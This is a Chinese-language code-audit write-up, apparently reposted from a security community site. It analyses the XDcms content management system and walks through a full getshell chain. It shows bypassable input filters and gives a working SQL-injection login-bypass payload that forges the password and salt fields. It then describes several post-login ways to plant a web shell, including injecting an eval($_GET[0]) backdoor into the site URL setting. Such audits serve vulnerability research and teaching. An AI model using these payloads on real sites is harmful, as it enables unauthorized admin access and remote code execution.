> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/93C0PzWHAQ4BPvIcn-KO5g)

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LebHs2DGyKAEgZupcIbXWAgnQlIoLerewyAX3c3bLLg0iaTpJeUuGKrSWsicRvLMXwCIbhkUC8GqGibg/640?wx_fmt=gif)

原创稿件征集

  

邮箱：edu@antvsion.com

QQ：3200599554

黑客与极客相关，互联网安全领域里

的热点话题

漏洞、技术相关的调查或分析

稿件通过并发布还能收获

200-800 元不等的稿酬

```
本文转自先知社区：https://xz.aliyun.com/t/9466
作者：popstack2
```

一、前言  

-------

XDcms 是一款十分具有教学意义（挖洞）的 cms 软件，你可以在其中发现很多不同的漏洞和利用，下面我将讲述一条完整的 getshell 利用链。

二、框架分析
------

### 首页

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdpEXqgjwxd5mkXbA6RqVfM5qB967IaVd1NZkZ7Ad5g1gdxSVzDyOzoiaRaw3ZhyymPvj7HC7od0yg/640?wx_fmt=png)

常量声明  

包含常规配置文件，配置储存常用目录的常量，创建了一个 Smarty 模板示例来渲染网页内容，加载数据库配置文件`config.inc.php`和常用函数文件`fun.inc.php`。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdpEXqgjwxd5mkXbA6RqVfMmcN2gmU9bKwdJ9bZz8vvXYzJnvNrq9Nj973MHJJ5ia2hp4RLCVyaJnA/640?wx_fmt=png)

加载框架  

令人感到疑惑的是，他把框架的启动文件`global.inc.php`放到了`fun.inc.php`包含。

*   `clue.inc.php`一些提示文本
    
*   `base.class.php`几个基类 (base、db、checkLogin)
    
*   `Cookie.class.php`设置 cookie 的类及方法（前面类的首字母都是小写）
    
*   `global.inc.php`启动框架
    

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdpEXqgjwxd5mkXbA6RqVfMDNUyR2xhYyFS696kNHbO6BGsxWKicmVlFSPict2iagbzTfbWDp60qDBzg/640?wx_fmt=png)

### 启动框架

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdpEXqgjwxd5mkXbA6RqVfMibFib6ePnRWLbcTKPJgJw2aS44yLvibvWU1cKgkz96BO8N9csc8h0ktXA/640?wx_fmt=png)

框架启动可以说是很简易了，充满了不安全的气息.

*   包含任意 php 文件。
    
*   如果类构造方法没有鉴权，就可以调用任意方法。
    
*   调用的`safe_html`正则更是一绝
    
    #### 两个安全函数的绕过
    

```
function safe_html($str){
    if(empty($str)){return;}
    $str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file
|outfile/','',$str);
    return htmlspecialchars($str);
}
```

我们有  

*   双写绕过
    
*   大小写绕过
    
*   换号绕过
    
*   ....
    

等等这么多种绕过方法。

```
function safe_replace($string) {
    $string = str_replace('%20','',$string);
    $string = str_replace('%27','',$string);
    $string = str_replace('%2527','',$string);
    $string = str_replace('*','',$string);
    $string = str_replace('"','"',$string);
    $string = str_replace("'",'',$string);
    $string = str_replace('"','',$string);
    $string = str_replace(';','',$string);
    $string = str_replace('<','<',$string);
    $string = str_replace('>','>',$string);
    $string = str_replace("{",'',$string);
    $string = str_replace('}','',$string);
    $string = str_replace('\\','',$string);
    return $string;
}
```

对于这个过滤函数我们完全可以不理他，因为很多地方忘记调用这个来进行安全过滤了（xz 上另一位分析该 cms 的朋友不会绕这个

### 启动流程结束

三、漏洞挖掘
------

对于这样的流程，我们可以考虑寻找不需要鉴权的类方法调用（几乎所有的方法都是`public`公开方法

），下面我们来尝试发现一下。

### 任意调用 db 基类恶意方法

上来就逮到了，__call 魔术方法把请求直接返回。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdpEXqgjwxd5mkXbA6RqVfMIxNOqFf4BFVy8ibzKKl9ziaHT6klVuxibgiawiaJ2n9AprJcNKExsU9a7UA/640?wx_fmt=png)

其他方法均继承了该方法，也就是说我们发现了一个 XSS 漏洞并没有什么危险。  

好了发现完毕。

### SQL 注入

是的，看似**不安全**的流程在 mvc 的设计理念下也可以很轻易地做到**安全**，本 cms 唯一的缺陷（如果目录系统有其他可以利用的 php 类文件的话，但是并没有）就是**没有统一接收变量和安全处理变量**吧（写的细碎的正则）。

但是安全是一个追求极致的哲学，任何一个缺陷都可能造成整个大厦崩盘，下面我们将利用 sql 注入拿到更高权限。对于本系统后台密码**加盐**并**使用了自己写的加密算法加密**，一般的注入难以进行下一步的登录后台、getshell 等操作。

### 但是！！！

./system/modules/xdcms/login.php -》check 方法

```
public function check(){

        $username = safe_html($_POST['username']);
        $password = safe_html($_POST['password']);
        $verifycode = safe_html($_POST['verifycode']);
        ...
        $sql="select * from ".DB_PRE."admin where `username`='$username'";
        ...
        $rs=$this->mysql->get_one($sql);
        $password=password($password,$rs['encrypt']);
        if($password!=$rs['password']){
            showmsg(C('password_error'),'-1');
        }
```

可以看到他这里调用了不安全的 safe_html 来处理登录请求，存在 sql 注入！

但是后台密码加了盐怎么利用呢？

答案是万能密码。我们可以利用联合查询控制查询结果，控制`password`字段以及`encrypt`字段来完成他的判定逻辑。

登录逻辑流程：

*   接收账号、密码、验证码，进行了可绕过的过滤
    
*   查询数据库里 username 为我们输入的账号的用户
    
*   取出第一条结果的 encrypt 字段，和我们输入的密码一起作为参数，调用`password`函数
    
*   将函数加密的结果与查询结果比对，若一致则登录成功。
    

那么我们的利用逻辑就很清晰了，利用注入控制 password 字段和 encrypt 字段，使得`$rs['password']==password($_POST['password'],$rs['encrypt'])`。

我们把 password 函数拉出来，计算 password('123456','1') 作为我们修改的 password，encrypt 为 1，然后我们输入 123456 便成功登录。

构造的 payload 如下

`username=q'union selselectect 1,2,'c6c6e122d028f5e37f845c8660374b78' password,'1' encrypt,5,6,7,8,9,10#&password=123456&verifycode=&button=`

我们测试一下

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdpEXqgjwxd5mkXbA6RqVfMhMQ1QFZqJbtVSziaIdpWBr61mquicNhbD8zDhM6DVGuhic6EIdwmP3oDw/640?wx_fmt=png)

可以看到我们成功登录了。  

登录以后，XDCMS 就是个任你揉捏的面团了，我们很随便地找到一万种拿 shell 方法。

### 写配置文件 getshell 的方法拿到 shell。

后台 -> 系统设置 -> 网页设置 -> 基本信息

```
$cms=SYS_PATH.'xdcms.inc.php';   //生成xdcms配置文件
            $cmsurl="<?php\n define('CMS_URL','".$info['siteurl']."');\n define('TP_FOLDER','".$info['template']."');\n define('TP_CACHE',".$info['caching'].");\n?>";
            creat_inc($cms,$cmsurl);
```

设置 siteurl 为`http://127.0.0.1/');eval($_GET[0]);`即可。

### 设置允许上传后缀拿 shell

后台 -> 系统设置 -> 网页设置 -> 上传设置

添加 phtml（php 默认在黑名单），上传 phtml 拿到 shell

### 模板管理写配置拿 shell

后台 -> 系统设置 -> 栏目管理 -> 管理栏目，这里每个变量都可以写，注意闭合语句减少对网站的破坏。

### ...

四、总结
----

我们经过本次审计分析了 XDCMS 工作流程，确定了 MVC 控制框架安全的可靠性，最后创新性地利用注入构造万能密码进入后台拿到设立了。总体难度不大，相信同志们都有所收获。

**命令注入漏洞的代码审计**

https://www.hetianlab.com/expc.do?ec=ECIDf80c-799d-4bd5-979c-475ff391351a&pk_campaign=weixin-wemedia#stu     

通过本节的学习，了解命令注入漏洞的原理，通过代码审计掌握挖掘命令注入漏洞的方法，了解命令注入漏洞产生的原因。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdpEXqgjwxd5mkXbA6RqVfMjib6Lehc4B4mqQiaSlJAqZDlp8FsoQ4W4tSbiclA8cPRbicKVrsAalYq9w/640?wx_fmt=png)

更多靶场实操，点击下方 “  阅读原文 ”